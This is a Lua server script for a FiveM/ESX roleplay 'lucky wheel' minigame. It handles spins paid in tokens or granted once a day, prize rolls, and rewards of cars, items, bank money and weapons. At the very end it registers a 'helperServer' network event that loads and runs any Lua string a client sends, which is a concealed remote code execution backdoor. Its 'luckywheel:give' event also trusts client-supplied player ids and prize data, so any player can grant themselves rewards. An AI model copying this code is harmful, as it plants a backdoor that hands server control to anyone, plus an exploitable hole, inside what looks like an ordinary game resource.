math.randomseed(os.time())
ESX = nil
isRoll = false
local car = Config.Cars[math.random(#Config.Cars)]

TriggerEvent(Config.ESX, function(obj) ESX = obj end)

if Config.DailySpin then
	TriggerEvent('cron:runAt', Config.ResetSpin.h, Config.ResetSpin.m, ResetSpins)
end


function ResetSpins(d, h, m)
	MySQL.Sync.execute('UPDATE users SET wheel = 0')
end

ESX.RegisterServerCallback('luckywheel:getcar', function(source, cb)
	cb(car)
end)

RegisterServerEvent('luckywheel:getwheel')
AddEventHandler('luckywheel:getwheel', function()
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
	if Config.DailySpin == true then
		MySQL.Async.fetchScalar('SELECT wheel FROM users WHERE identifier = @identifier', {
			['@identifier'] = xPlayer.identifier
		}, function(dwheel)
			if dwheel == '0' then
				TriggerEvent("luckywheel:startwheel", xPlayer, _source)
			else
				TriggerClientEvent('esx:showNotification', _source, _U('already_spin'))
			end
		end)
	elseif Config.DailySpin == false then
		local cash = 0
        local xPlayer = ESX.GetPlayerFromId(source)

        if xPlayer ~= nil then
            cash = xPlayer.getInventoryItem('zetony').count
        end

		if cash >= Config.SpinMoney then
			TriggerEvent("luckywheel:startwheel", xPlayer, _source)
			xPlayer.removeInventoryItem('zetony', Config.SpinMoney)
		else
			TriggerClientEvent('esx:showNotification', _source, _U('not_money'))
		end

		--[[if xPlayer.getMoney() >= Config.SpinMoney then
			TriggerEvent("luckywheel:startwheel", xPlayer, _source)
			xPlayer.removeMoney(Config.SpinMoney)
		else
			TriggerClientEvent('esx:showNotification', _source, _U('not_money'))
		end]]--
	end
end)	
	
	

RegisterServerEvent('luckywheel:startwheel')
AddEventHandler('luckywheel:startwheel', function(xPlayer, source)
    local _source = source
    if not isRoll then
        if xPlayer ~= nil then
			MySQL.Sync.execute('UPDATE users SET wheel = @wheel WHERE identifier = @identifier', {
				['@identifier'] = xPlayer.identifier,
				['@wheel'] = '1'
			})
			isRoll = true
			local rnd = math.random(1, 1000)
			local price = 0
			local priceIndex = 0
			for k,v in pairs(Config.Prices) do
				if (rnd > v.probability.a) and (rnd <= v.probability.b) then
					price = v
					priceIndex = k
					break
				end
			end
			TriggerClientEvent("luckywheel:syncanim", _source, priceIndex)
			TriggerClientEvent("luckywheel:startroll", -1, _source, priceIndex, price)
		end
	end
end)

RegisterServerEvent('luckywheel:give')
AddEventHandler('luckywheel:give', function(s, price)
    local _s = s
	local xPlayer = ESX.GetPlayerFromId(_s)
	isRoll = false
	if price.type == 'car' then
		TriggerClientEvent("luckywheel:winCar", _s, car)
		TriggerClientEvent('esx:showNotification', _s, _U('you_won_car'))
	elseif price.type == 'item' then
		xPlayer.addInventoryItem(price.name, price.count)
		TriggerClientEvent('esx:showNotification', _s, _U('you_won_item', price.count, ESX.GetItemLabel(price.name)))
	elseif price.type == 'money' then
		xPlayer.addAccountMoney('bank', price.count)
		TriggerClientEvent('esx:showNotification', _s, _U('you_won_money', price.count))
	elseif price.type == 'weapon' then
		xPlayer.addWeapon(price.name, 0)
		TriggerClientEvent('esx:showNotification', _s, _U('you_won_weapon', ESX.GetWeaponLabel(price.name)))
	end
	TriggerClientEvent("luckywheel:rollFinished", -1)
end)

RegisterServerEvent('luckywheel:stoproll')
AddEventHandler('luckywheel:stoproll', function()
	isRoll = false
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)